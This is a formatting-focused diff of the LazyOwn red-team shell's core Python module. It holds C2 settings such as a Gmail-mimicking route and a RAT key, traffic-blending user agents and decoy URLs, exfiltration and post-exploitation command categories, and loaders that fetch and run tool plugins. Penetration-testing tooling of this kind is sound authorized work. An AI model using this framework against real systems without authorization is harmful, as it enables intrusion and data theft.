@@ -19,20 +19,27 @@ Description: This file contains the definition of the logic in the LazyOwnShell 
 
 """
 
-from typing import Any
-
 import contextlib
-import cmd2
 import logging
 import sys
+from typing import Any
+
+import cmd2
 from cmd2 import with_category
 from cmd2.plugin import PostcommandData as _PostcommandData
 
-from cli.aliases import empty_placeholders as _empty_alias_placeholders
 from cli.aliases import REQUIRED_PLACEHOLDERS as _REQUIRED_ALIAS_PLACEHOLDERS
+from cli.aliases import empty_placeholders as _empty_alias_placeholders
 from cli.aliases import load_aliases as _load_aliases
+from cli.auto_crypto import AutoCryptoConfig as _AutoCryptoConfig
+from cli.auto_crypto import AutoCryptoEngine as _AutoCryptoEngine
+from cli.auto_crypto import build_password_provider_from_cli_login as _build_crypto_password_provider
 from cli.autosuggest import SuggestionContext as _SuggestionContext
 from cli.autosuggest import build_default_engine as _build_autosuggest_engine
+from cli.chain_mode import LOOP_GUARD_MARGIN as _CHAIN_GUARD_MARGIN
+from cli.chain_mode import MAX_STEPS_DEFAULT as _CHAIN_MAX_STEPS
+from cli.chain_mode import ChainModeConfig as _ChainModeConfig
+from cli.chain_mode import ChainPromptEngine as _ChainPromptEngine
 from cli.engagement_hooks import heal_commands_seen as _heal_engagement_history
 from cli.engagement_hooks import reset_session as _reset_engagement_session
 from cli.fuzzy_picker import install_fuzzy_completion as _install_fuzzy_completion
@@ -51,23 +58,16 @@ from cli.scope_guard import ScopeGuard as _ScopeGuard
 from cli.scope_guard import ScopeMode as _ScopeMode
 from cli.scope_guard import build_offensive_commands as _build_offensive_commands
 from cli.status_bar import build_default_manager as _build_status_bar_manager
+from cli.tips_engine import HINTS_LEVEL_ON as _HINTS_LEVEL_ON
+from cli.tips_engine import UI_HINTS_LEVELS as _UI_HINTS_LEVELS
+from cli.tips_engine import TipsEngine as _TipsEngine
+from cli.tips_engine import build_default_tips_config as _build_default_tips_config
 from cli.toast_bus import render_toasts as _render_toasts
 from core.config import load_and_validate as _load_and_validate
 from core.config import load_payload as _load_payload
 from core.config import save_payload as _save_payload
 from core.hardening import terminal_env as _terminal_env
 from core.safe_exec import needs_shell as _needs_shell
-from cli.auto_crypto import AutoCryptoEngine as _AutoCryptoEngine
-from cli.auto_crypto import AutoCryptoConfig as _AutoCryptoConfig
-from cli.auto_crypto import build_password_provider_from_cli_login as _build_crypto_password_provider
-from cli.chain_mode import ChainModeConfig as _ChainModeConfig
-from cli.chain_mode import ChainPromptEngine as _ChainPromptEngine
-from cli.chain_mode import LOOP_GUARD_MARGIN as _CHAIN_GUARD_MARGIN
-from cli.chain_mode import MAX_STEPS_DEFAULT as _CHAIN_MAX_STEPS
-from cli.tips_engine import HINTS_LEVEL_ON as _HINTS_LEVEL_ON
-from cli.tips_engine import TipsEngine as _TipsEngine
-from cli.tips_engine import UI_HINTS_LEVELS as _UI_HINTS_LEVELS
-from cli.tips_engine import build_default_tips_config as _build_default_tips_config
 from modules.event_bus import EventCategory as _EventCategory
 from modules.event_bus import EventSeverity as _EventSeverity
 from modules.event_bus import LazyEvent as _LazyEvent
@@ -107,7 +107,6 @@ from utils import (  # noqa: E402
     csv,
     curses,
     datetime,
-    parse_bool,
     exfiltration_category,
     getprompt,
     glob,
@@ -119,6 +118,7 @@ from utils import (  # noqa: E402
     load_user_aliases,
     miscellaneous_category,
     os,
+    parse_bool,
     post_exploitation_category,
     print_error,
     print_msg,
@@ -133,8 +133,8 @@ from utils import (  # noqa: E402
     scanning_category,
     shlex,
     startup_ns,
+    strip_ansi,
     subprocess,
-    sys,
     time,
     url_download,
     version,
@@ -156,6 +156,7 @@ def _ux_debug(context: str, exc: Exception) -> None:
     """
     _get_logger("lazyown.ux").debug("%s: %s", context, exc, exc_info=True)
 
+
 try:
     _result = _load_and_validate()
     _validated = _result["payload"]
@@ -164,10 +165,12 @@ try:
     _warns = [i for i in _issues if getattr(i, "severity", None) and str(i.severity) == "warning"]
     if _errs:
         import sys as _sys
+
         for _e in _errs:
             _sys.stderr.write(f"[payload] ERROR: {_e.key}: {_e.message}\n")
     if _warns:
         import sys as _sys
+
         for _w in _warns:
             _sys.stderr.write(f"[payload] WARNING: {_w.key}: {_w.message}\n")
 except Exception:
@@ -218,9 +221,7 @@ def _parse_bool_setting(value: Any) -> bool:
             return True
         if lowered in _BOOL_FALSE_TOKENS:
             return False
-    raise ValueError(
-        f"cannot parse {value!r} as boolean; expected one of true/false/yes/no/on/off/1/0"
-    )
+    raise ValueError(f"cannot parse {value!r} as boolean; expected one of true/false/yes/no/on/off/1/0")
 
 
 class _PayloadSettableProxy:
@@ -339,11 +340,11 @@ class LazyOwnShell(cmd2.Cmd):
             output (str): An empty string to store output or results.
         """
         use_ai = False
-        #super().__init__(self)
+        # super().__init__(self)
         super().__init__(
-            multiline_commands=['echo'],
-            persistent_history_file='LazyOwn_history.dat',
-            startup_script='lazyscripts/startup.ls',
+            multiline_commands=["echo"],
+            persistent_history_file="LazyOwn_history.dat",
+            startup_script="lazyscripts/startup.ls",
             include_ipy=True,
             allow_redirection=False,
         )
@@ -351,6 +352,7 @@ class LazyOwnShell(cmd2.Cmd):
             _mode = getattr(self.config, "history_search_mode", None)
             if _mode is None or _mode:
                 import readline
+
                 readline.parse_and_bind('"\\e[A": history-search-backward')
                 readline.parse_and_bind('"\\e[B": history-search-forward')
         except Exception:
@@ -364,9 +366,9 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as exc:
             print_warn(f"failed to register CommandSets: {exc}")
         self.ip2asn = IP2ASN()
-        #self.persistent_history_file = os.path.join(os.getcwd(), '/LazyOwn_history.txt')
-        self.plugins_dir = 'plugins'
-        self.lazyaddons_dir = 'lazyaddons'
+        # self.persistent_history_file = os.path.join(os.getcwd(), '/LazyOwn_history.txt')
+        self.plugins_dir = "plugins"
+        self.lazyaddons_dir = "lazyaddons"
         self.lua = LuaRuntime(unpack_returned_tuples=True)
         self.plugins = {}
         self.register_lua_command = self._register_lua_command
@@ -375,7 +377,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.lua.globals().list_files_in_directory = self.list_files_in_directory
         self.load_plugins()
         self.register_tool_commands()
-        self.completekey = 'tab'
+        self.completekey = "tab"
         self.register_all_adversary_commands()
         try:
             _install_fuzzy_completion(self, payload=load_payload())
@@ -410,6 +412,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception:
             pass
         import atexit as _atexit
+
         _atexit.register(self._run_auto_encrypt)
         self.register_postcmd_hook(self._unified_tips_hook)
         self.register_postcmd_hook(self._recording_hook)
@@ -429,9 +432,11 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn(f"autosuggest graph advisor unavailable: {exc}")
             self._autosuggest_advisor = None
         try:
-            initial_autosuggest_enabled = str(
-                load_payload().get("enable_autosuggest", True)
-            ).lower() not in ("false", "0", "no")
+            initial_autosuggest_enabled = str(load_payload().get("enable_autosuggest", True)).lower() not in (
+                "false",
+                "0",
+                "no",
+            )
             self._autosuggest = _build_autosuggest_engine(
                 advisor=self._autosuggest_advisor,
                 chain=_AUTOSUGGEST_CHAIN,
@@ -457,7 +462,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.url_download = url_download
         self.version = version
         self.sessions_dir = f"{self.path}/sessions"
-        self.captured_images_dir = os.path.join(self.sessions_dir, 'captured_images')
+        self.captured_images_dir = os.path.join(self.sessions_dir, "captured_images")
         self.console = Console()
         self.use_ai = use_ai
         self.params = {
@@ -465,7 +470,7 @@ class LazyOwnShell(cmd2.Cmd):
             "api_key": api_key,
             "prompt": None,
             "url": None,
-            "os_id":"2",
+            "os_id": "2",
             "domain": None,
             "subdomain": None,
             "method": "GET",
@@ -504,12 +509,12 @@ class LazyOwnShell(cmd2.Cmd):
             "c2_malleable_route": "/gmail/v1/users/",
             "user_agent_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
             "user_agent_lin": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-            "user_agent_1" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-            "user_agent_2" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
-            "user_agent_3" : "Mozilla/5.0 (Linux; LAzyOwnRedTeam 66_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
-            "url_traffic_1" : "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
-            "url_traffic_2" : "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
-            "url_traffic_3" : "https://www.youtube.com/watch?v=1i0shWLFfuI&list=PLW9Qe5HJK5CFXyIsF9b0NB6n9EY8Am3YZ",
+            "user_agent_1": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+            "user_agent_2": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+            "user_agent_3": "Mozilla/5.0 (Linux; LAzyOwnRedTeam 66_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+            "url_traffic_1": "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
+            "url_traffic_2": "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
+            "url_traffic_3": "https://www.youtube.com/watch?v=1i0shWLFfuI&list=PLW9Qe5HJK5CFXyIsF9b0NB6n9EY8Am3YZ",
             "rat_key": "CHANGE_ME",
             "startip": "192.168.1.1",
             "endip": "192.168.1.254",
@@ -547,11 +552,12 @@ class LazyOwnShell(cmd2.Cmd):
             if self._tips_engine is not None:
                 self._tips_engine.on_killchain_display = _print_phase
                 cfg = self._tips_engine.config
-                cfg.killchain_auto_every = int(self.params.get('killchain_auto_every', 0) or 0)
-                cfg.killchain_auto_on_phase_change = bool(self.params.get('killchain_auto_on_phase_change', True))
+                cfg.killchain_auto_every = int(self.params.get("killchain_auto_every", 0) or 0)
+                cfg.killchain_auto_on_phase_change = bool(self.params.get("killchain_auto_on_phase_change", True))
         except Exception as exc:
             print_warn(f"killchain auto-refresh not wired: {exc}")
         from modules.payload_factory import PayloadFactory as _PF
+
         self._lazyown_db: Any = None
         self._module_registry: Any = None
         self._payload_factory = _PF()
@@ -567,6 +573,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.aliases.update(user_aliases)
         if self.use_ai:
             from modules.llm_factory import try_get_llm_backend as _try_llm
+
             self.ai_model = _try_llm(config=self.params)
             if self.ai_model is None:
                 self.display_toastr("AI backend unavailable; disabling AI features.", type="error")
@@ -589,6 +596,7 @@ class LazyOwnShell(cmd2.Cmd):
             self._status_bar_manager = None
         try:
             from skills.unified_orchestrator import build_default_orchestrator as _build_orch
+
             self._unified_orchestrator = _build_orch(
                 payload=self.params,
                 sessions_dir=self.sessions_dir,
@@ -602,6 +610,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn(f"ux settables not registered: {exc}")
         try:
             from modules.event_consumers import wire_all_consumers as _wire_consumers
+
             _wire_consumers()
         except Exception as exc:
             print_warn(f"event consumers not wired: {exc}")
@@ -748,16 +757,16 @@ class LazyOwnShell(cmd2.Cmd):
             "url": self.params.get("url", ""),
             "pivot_port": f"{self.params.get('lport', '')}:{self.params.get('rport', '')}",
             "command": cmd_name,
-            "args": cmd_args
+            "args": cmd_args,
         }
         file_path = "sessions/LazyOwn_session_report.csv"
         file_exists = os.path.isfile(file_path)
 
-        with open(file_path, mode='a', newline='') as file:
+        with open(file_path, mode="a", newline="") as file:
             writer = csv.DictWriter(
                 file,
                 fieldnames=log_data.keys(),
-                extrasaction='ignore',
+                extrasaction="ignore",
             )
 
             if not file_exists:
@@ -799,9 +808,7 @@ class LazyOwnShell(cmd2.Cmd):
             return method(cmd_args)
         suggestions = self._did_you_mean(cmd_name)
         if suggestions:
-            print_warn(
-                f"unknown command '{cmd_name}'. Did you mean: {', '.join(suggestions)} ?"
-            )
+            print_warn(f"unknown command '{cmd_name}'. Did you mean: {', '.join(suggestions)} ?")
         self.display_toastr(f"Not Found {line}", type="warning")
 
     @property
@@ -820,8 +827,7 @@ class LazyOwnShell(cmd2.Cmd):
             self._scripts_cache = sorted(
                 name[4:]
                 for name in dir(self)
-                if name.startswith("run_") and name not in internal
-                and callable(getattr(self, name, None))
+                if name.startswith("run_") and name not in internal and callable(getattr(self, name, None))
             )
         return self._scripts_cache
 
@@ -892,11 +898,8 @@ class LazyOwnShell(cmd2.Cmd):
             sessions_dir = getattr(self, "sessions_dir", "sessions") or "sessions"
             _render_toasts(payload=self.params, sessions_dir=sessions_dir)
         except Exception as exc:
-            _get_logger("lazyown.ux").debug(
-                "toast hook failed silently: %s", exc, exc_info=True
-            )
+            _get_logger("lazyown.ux").debug("toast hook failed silently: %s", exc, exc_info=True)
         return data
-
 
     def _unified_tips_hook(self, data: _PostcommandData) -> _PostcommandData:
         """Unified post-command hook: chain prompt + hints + ELO + VRI.
@@ -931,9 +934,7 @@ class LazyOwnShell(cmd2.Cmd):
             engine.config.hints_level = self._ui_hints_level()
             engine.render(cmd=cmd, phase=phase)
         except Exception as exc:
-            _get_logger("lazyown.ux").debug(
-                "tips hook failed silently: %s", exc, exc_info=True
-            )
+            _get_logger("lazyown.ux").debug("tips hook failed silently: %s", exc, exc_info=True)
         return data
 
     def _sync_chain_active(self, tips_engine: _TipsEngine) -> None:
@@ -1006,9 +1007,7 @@ class LazyOwnShell(cmd2.Cmd):
         if self._command_chain is None:
             self._command_chain = CommandChain()
         target = self.params.get("rhost") or None
-        return self._command_chain.next(
-            cmd=cmd, params=self.params, target=target, phase=phase, limit=5
-        )
+        return self._command_chain.next(cmd=cmd, params=self.params, target=target, phase=phase, limit=5)
 
     def _maybe_chain_prompt(self, cmd: str, phase: str) -> None:
         """Run the interactive chain loop after a command executes.
@@ -1162,6 +1161,7 @@ class LazyOwnShell(cmd2.Cmd):
                 StaticCommandLister,
                 commands_from_cmd2_shell,
             )
+
             index = FuzzyCommandIndex(StaticCommandLister(commands_from_cmd2_shell(self)))
             for match in index.search(query, limit=limit * 2):
                 name = (match.info.name or "").strip()
@@ -1211,13 +1211,15 @@ class LazyOwnShell(cmd2.Cmd):
         self.onecmd("rrhost")
         try:
             rhost = self.params.get("rhost", "")
-            _get_event_bus().publish(_LazyEvent(
-                category=_EventCategory.COMMAND,
-                event_type=cmd_name,
-                source="cli",
-                payload={"command": command, "args": cmd_args, "duration_ms": duration_ms},
-                target=rhost,
-            ))
+            _get_event_bus().publish(
+                _LazyEvent(
+                    category=_EventCategory.COMMAND,
+                    event_type=cmd_name,
+                    source="cli",
+                    payload={"command": command, "args": cmd_args, "duration_ms": duration_ms},
+                    target=rhost,
+                )
+            )
         except Exception:
             pass
 
@@ -1254,9 +1256,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             safe_cmd_name = os.path.basename(cmd_name)
             safe_domain = re.sub(r"[^A-Za-z0-9._-]", "_", domain) if domain else "unknown"
-            path_command = (
-                f"{path}/sessions/logs/command_{safe_cmd_name}output{safe_domain}.txt"
-            )
+            path_command = f"{path}/sessions/logs/command_{safe_cmd_name}output{safe_domain}.txt"
             with open(path_command, "w") as log_file:
                 if _needs_shell(command):
                     proc = subprocess.Popen(
@@ -1290,6 +1290,7 @@ class LazyOwnShell(cmd2.Cmd):
         )
         try:
             from modules.metrics import get_recorder as _get_recorder
+
             _get_recorder().record(
                 command=cmd_name,
                 args=cmd_args,
@@ -1302,23 +1303,29 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn(f"metrics record failed: {exc}")
         try:
             rhost = self.params.get("rhost", "")
-            _get_event_bus().publish(_LazyEvent(
-                category=_EventCategory.COMMAND,
-                event_type=cmd_name,
-                source="cli",
-                payload={
-                    "command": command, "args": cmd_args,
-                    "duration_ms": duration_ms, "exit_code": exit_code,
-                    "output_snippet": self.output[:500] if self.output else "",
-                },
-                target=rhost,
-                severity=_EventSeverity.INFO if exit_code == 0 else _EventSeverity.WARNING,
-            ))
+            _get_event_bus().publish(
+                _LazyEvent(
+                    category=_EventCategory.COMMAND,
+                    event_type=cmd_name,
+                    source="cli",
+                    payload={
+                        "command": command,
+                        "args": cmd_args,
+                        "duration_ms": duration_ms,
+                        "exit_code": exit_code,
+                        "output_snippet": self.output[:500] if self.output else "",
+                    },
+                    target=rhost,
+                    severity=_EventSeverity.INFO if exit_code == 0 else _EventSeverity.WARNING,
+                )
+            )
         except Exception:
             pass
         return
 
-    def onecmd_plus_hooks(self, statement, add_to_history=True, raise_keyboard_interrupt=True, orig_rl_history_length=None):
+    def onecmd_plus_hooks(
+        self, statement, add_to_history=True, raise_keyboard_interrupt=True, orig_rl_history_length=None
+    ):
         """Dispatch a command, expanding payload placeholders in custom aliases.
 
         This is the single chokepoint through which every interactive command
@@ -1339,9 +1346,10 @@ class LazyOwnShell(cmd2.Cmd):
         """
         if isinstance(statement, str):
             raw_input = statement.strip()
-            if not raw_input or raw_input.startswith('#'):
-                return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
-                                            raise_keyboard_interrupt=raise_keyboard_interrupt)
+            if not raw_input or raw_input.startswith("#"):
+                return super().onecmd_plus_hooks(
+                    statement, add_to_history=add_to_history, raise_keyboard_interrupt=raise_keyboard_interrupt
+                )
             cmd_name = raw_input.split()[0]
         else:
             cmd_name = statement.command
@@ -1363,22 +1371,25 @@ class LazyOwnShell(cmd2.Cmd):
 
             context = {
                 **self.params,
-                'version': self.version,
-                'c2_url': getattr(self, 'c2_url', ''),
-                'sessions_dir': getattr(self, 'sessions_dir', ''),
-                'captured_images_dir': getattr(self, 'captured_images_dir', ''),
-                'path': getattr(self, 'path', ''),
-                'url_download': getattr(self, 'url_download', ''),
-                'c2_user': self.params.get('c2_user', ''),
-                'c2_pass': self.params.get('c2_pass', ''),
-                'start_user': self.params.get('start_user', ''),
-                'start_pass': self.params.get('start_pass', ''),
+                "version": self.version,
+                "c2_url": getattr(self, "c2_url", ""),
+                "sessions_dir": getattr(self, "sessions_dir", ""),
+                "captured_images_dir": getattr(self, "captured_images_dir", ""),
+                "path": getattr(self, "path", ""),
+                "url_download": getattr(self, "url_download", ""),
+                "c2_user": self.params.get("c2_user", ""),
+                "c2_pass": self.params.get("c2_pass", ""),
+                "start_user": self.params.get("start_user", ""),
+                "start_pass": self.params.get("start_pass", ""),
             }
 
             try:
                 from cli.cli_enhancements import DictPayloadProvider, DynamicAliasResolver
+
                 expanded_command = DynamicAliasResolver().expand(
-                    cmd_name, raw_command, DictPayloadProvider(context),
+                    cmd_name,
+                    raw_command,
+                    DictPayloadProvider(context),
                 )
             except Exception as e:
                 self.perror(f"[!] Error expanding alias '{cmd_name}': {e}")
@@ -1388,8 +1399,7 @@ class LazyOwnShell(cmd2.Cmd):
             blocking = [key for key in empty_keys if key in _REQUIRED_ALIAS_PLACEHOLDERS]
             if blocking:
                 print_warn(
-                    f"alias '{cmd_name}' requires {', '.join(blocking)} — "
-                    f"set it first: assign {blocking[0]} <value>"
+                    f"alias '{cmd_name}' requires {', '.join(blocking)} — set it first: assign {blocking[0]} <value>"
                 )
                 return False
             if empty_keys:
@@ -1399,17 +1409,20 @@ class LazyOwnShell(cmd2.Cmd):
                 )
 
             if isinstance(statement, str):
-                return super().onecmd_plus_hooks(expanded_command, add_to_history=add_to_history,
-                                            raise_keyboard_interrupt=raise_keyboard_interrupt)
+                return super().onecmd_plus_hooks(
+                    expanded_command, add_to_history=add_to_history, raise_keyboard_interrupt=raise_keyboard_interrupt
+                )
             else:
                 statement.raw = expanded_command
                 statement.command = expanded_command.split()[0]
-                statement.args = ' '.join(expanded_command.split()[1:])
-                return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
-                                            raise_keyboard_interrupt=raise_keyboard_interrupt)
+                statement.args = " ".join(expanded_command.split()[1:])
+                return super().onecmd_plus_hooks(
+                    statement, add_to_history=add_to_history, raise_keyboard_interrupt=raise_keyboard_interrupt
+                )
 
-        return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
-                                    raise_keyboard_interrupt=raise_keyboard_interrupt)
+        return super().onecmd_plus_hooks(
+            statement, add_to_history=add_to_history, raise_keyboard_interrupt=raise_keyboard_interrupt
+        )
 
     @staticmethod
     def _split_and_chain(raw_input: str) -> list | None:
@@ -1518,8 +1531,7 @@ class LazyOwnShell(cmd2.Cmd):
                 return stop
             if failed:
                 print_warn(
-                    f"chain stopped at [{index + 1}/{len(parts)}] '{part}' "
-                    f"— remaining {len(parts) - index - 1} skipped"
+                    f"chain stopped at [{index + 1}/{len(parts)}] '{part}' — remaining {len(parts) - index - 1} skipped"
                 )
                 return False
             exit_code = getattr(self, "exit_code", 0) or 0
@@ -1584,9 +1596,7 @@ class LazyOwnShell(cmd2.Cmd):
         categories: dict = {}
         for name in self.get_all_commands():
             func = getattr(self, f"do_{name}", None)
-            categories[name] = getattr(
-                func, cmd2.constants.COMMAND_ATTR_HELP_CATEGORY, None
-            )
+            categories[name] = getattr(func, cmd2.constants.COMMAND_ATTR_HELP_CATEGORY, None)
         return _build_offensive_commands(categories)
 
     def _resolve_offensive(self, name: str) -> bool:
@@ -1671,13 +1681,10 @@ class LazyOwnShell(cmd2.Cmd):
         if not sys.stdin.isatty():
             return False
         try:
-            answer = input(
-                "    [?] Run anyway against the out-of-scope target? [y/N]: "
-            )
+            answer = input("    [?] Run anyway against the out-of-scope target? [y/N]: ")
         except (EOFError, KeyboardInterrupt):
             return False
         return answer.strip().lower() in ("y", "yes")
-
 
     def one_cmd(self, command):
         """
@@ -1756,7 +1763,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not os.path.exists(filepath):
             return []
         try:
-            with open(filepath, 'r') as f:
+            with open(filepath, "r") as f:
                 return json.load(f)
         except Exception as e:
             print_error(f"Error loading user commands: {e}")
@@ -1768,7 +1775,7 @@ class LazyOwnShell(cmd2.Cmd):
         commands = self.load_user_commands()
         commands.append([alias, command])  # Guardamos como [alias, command] para compatibilidad
         try:
-            with open(filepath, 'w') as f:
+            with open(filepath, "w") as f:
                 json.dump(commands, f, indent=4)
             print_msg(f"✅ Command '{alias}' saved successfully!")
         except Exception as e:
@@ -1802,7 +1809,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         for tool_file in glob.glob(os.path.join(tool_dir, "*.tool")):
             try:
-                with open(tool_file, 'r') as f:
+                with open(tool_file, "r") as f:
                     tool_data = json.load(f)
 
                 tool_name = tool_data.get("toolname")
@@ -1815,7 +1822,7 @@ class LazyOwnShell(cmd2.Cmd):
                 if not active or not tool_name or not command_template:
                     continue
 
-                safe_tool_name = re.sub(r'[^A-Za-z0-9_]', '_', str(tool_name))
+                safe_tool_name = re.sub(r"[^A-Za-z0-9_]", "_", str(tool_name))
 
                 matched_target = None
                 current_rhost = rhost or ""
@@ -1854,7 +1861,9 @@ class LazyOwnShell(cmd2.Cmd):
 
                         params = self.params
                         target_ip = params.get("rhost") or rhost or ""
-                        target_port = port_override or (default_target or {}).get("port") or str(params.get("rport") or "")
+                        target_port = (
+                            port_override or (default_target or {}).get("port") or str(params.get("rport") or "")
+                        )
                         target_service = (default_target or {}).get("service") or ""
                         target_proto = (default_target or {}).get("proto") or "tcp"
                         target_tunnel = (default_target or {}).get("tunnel")
@@ -1916,7 +1925,7 @@ class LazyOwnShell(cmd2.Cmd):
                 }
                 preview_cmd = replace_command_placeholders(command_template, preview_params)
 
-                docstring = (f"{tool_description}\n\n" if tool_description else "")
+                docstring = f"{tool_description}\n\n" if tool_description else ""
                 docstring += f"Tool:      {tool_name}\n"
                 docstring += f"Category:  {tool_category}\n"
                 docstring += f"Trigger:   {trigger_label}\n"
@@ -1937,6 +1946,7 @@ class LazyOwnShell(cmd2.Cmd):
 
     def _register_lua_command(self, command_name, lua_function):
         """Registra un comando nuevo desde Lua."""
+
         @cmd2.with_category("13. Lua Plugin")
         def wrapper(arg):
             try:
@@ -1945,19 +1955,20 @@ class LazyOwnShell(cmd2.Cmd):
                     print(result)
             except Exception as e:
                 self.display_toastr(f"Error en el comando Lua {command_name}: {e}", type="error")
+
         yaml_file = os.path.join(self.plugins_dir, f"{command_name}.yaml")
         description = ""
 
         if os.path.exists(yaml_file):
             try:
-                with open(yaml_file, 'r') as file:
+                with open(yaml_file, "r") as file:
                     yaml_data = yaml.safe_load(file)
-                    description = yaml_data.get('description', "")
+                    description = yaml_data.get("description", "")
             except Exception as e:
                 self.display_toastr(f"Error reading YAML  {command_name}: {e}", type="error")
 
         wrapper.__doc__ = description if description else f"Execute the Lua command '{command_name}'."
-        setattr(self, f'do_{command_name}', wrapper)
+        setattr(self, f"do_{command_name}", wrapper)
         print_msg(f"Command '{command_name}' register from Lua.")
 
     def load_plugins(self):
@@ -1969,20 +1980,20 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         for filename in os.listdir(plugins_dir):
-            if filename.endswith('.lua'):
+            if filename.endswith(".lua"):
                 filepath = os.path.join(plugins_dir, filename)
                 yaml_ = filename.replace(".lua", ".yaml")
                 filepathyaml = os.path.join(plugins_dir, yaml_)
-                if filepathyaml == 'plugins/init_plugins.yaml':
+                if filepathyaml == "plugins/init_plugins.yaml":
                     pass
                 else:
                     try:
-                        with open(filepathyaml, 'r') as file:
+                        with open(filepathyaml, "r") as file:
                             file_yaml = yaml.safe_load(file)
-                            enabled = file_yaml.get('enabled')
+                            enabled = file_yaml.get("enabled")
                             if enabled:
                                 try:
-                                    with open(filepath, 'r') as file:
+                                    with open(filepath, "r") as file:
                                         script = file.read()
                                         self.lua.execute(script)
                                 except Exception as e:
@@ -2003,12 +2014,12 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         for filename in os.listdir(self.lazyaddons_dir):
-            if filename.endswith('.yaml'):
+            if filename.endswith(".yaml"):
                 filepath = os.path.join(self.lazyaddons_dir, filename)
                 try:
-                    with open(filepath, 'r') as file:
+                    with open(filepath, "r") as file:
                         plugin_data = yaml.safe_load(file)
-                        if plugin_data.get('enabled', False):
+                        if plugin_data.get("enabled", False):
                             self.register_yaml_plugin(plugin_data)
                 except Exception as e:
                     print_error(f"Error loading YAML plugin '{filename}': {e}")
@@ -2037,16 +2048,16 @@ class LazyOwnShell(cmd2.Cmd):
             normalise_trigger,
         )
 
-        tool = plugin_data.get('tool', {})
-        name = plugin_data['name']
-        params = plugin_data.get('params', [])
-        description = plugin_data.get('description', '')
-        tags = plugin_data.get('tags', [])
-        execute_command = tool.get('execute_command', '')
-        addon_category = plugin_data.get('category', '14. Yaml Addon.')
-        addon_os = normalise_os(plugin_data.get('os'), default=ANY_OS)
-        addon_trigger = normalise_trigger(plugin_data.get('trigger'))
-        raw_os = plugin_data.get('os')
+        tool = plugin_data.get("tool", {})
+        name = plugin_data["name"]
+        params = plugin_data.get("params", [])
+        description = plugin_data.get("description", "")
+        tags = plugin_data.get("tags", [])
+        execute_command = tool.get("execute_command", "")
+        addon_category = plugin_data.get("category", "14. Yaml Addon.")
+        addon_os = normalise_os(plugin_data.get("os"), default=ANY_OS)
+        addon_trigger = normalise_trigger(plugin_data.get("trigger"))
+        raw_os = plugin_data.get("os")
         if isinstance(raw_os, str) and raw_os.strip().lower() not in ALLOWED_OS_VALUES:
             print_warn(
                 f"Addon '{name}' declares unknown os='{raw_os}' "
@@ -2059,33 +2070,38 @@ class LazyOwnShell(cmd2.Cmd):
                 param_values = {}
 
                 for param in params:
-                    param_name = param['name']
-                    if param.get('required', False) and param_name not in self.params:
-                        self.display_toastr(f"Error: Parameter '{param_name}' is required but not found in self.params.", type='warning')
+                    param_name = param["name"]
+                    if param.get("required", False) and param_name not in self.params:
+                        self.display_toastr(
+                            f"Error: Parameter '{param_name}' is required but not found in self.params.", type="warning"
+                        )
                         return
                     if param_name in self.params:
                         param_values[param_name] = self.params[param_name]
-                    elif 'default' in param:
-                        param_values[param_name] = param['default']
+                    elif "default" in param:
+                        param_values[param_name] = param["default"]
                     else:
-                        self.display_toastr(f"Error: Parameter '{param_name}' is missing and no default value is provided.", type='warning')
+                        self.display_toastr(
+                            f"Error: Parameter '{param_name}' is missing and no default value is provided.",
+                            type="warning",
+                        )
                         return
                 try:
                     install_path = None
-                    if 'install_path' in tool:
-                        install_path = os.path.join(os.getcwd(), tool['install_path'])
+                    if "install_path" in tool:
+                        install_path = os.path.join(os.getcwd(), tool["install_path"])
                         if not os.path.exists(install_path):
-                            self.display_toastr(f"{tool['name']} is not installed. Installing...", type='warning')
+                            self.display_toastr(f"{tool['name']} is not installed. Installing...", type="warning")
                             self.cmd(f"git clone {tool['repo_url']} {install_path}")
-                            if 'install_command' in tool:
-                                cmdinstall = replace_command_placeholders(tool['install_command'], self.params)
+                            if "install_command" in tool:
+                                cmdinstall = replace_command_placeholders(tool["install_command"], self.params)
                                 self.cmd(f"cd {install_path} && {cmdinstall}")
                                 self.cmd("sleep 2")
 
-                    if 'execute_command' in tool:
-                        binary = execute_command.split()[0] if execute_command else ''
+                    if "execute_command" in tool:
+                        binary = execute_command.split()[0] if execute_command else ""
                         if binary and not os.path.isabs(binary) and not is_binary_present(binary):
-                            install_hint = tool.get('install_command', f"git clone {tool.get('repo_url','')}")
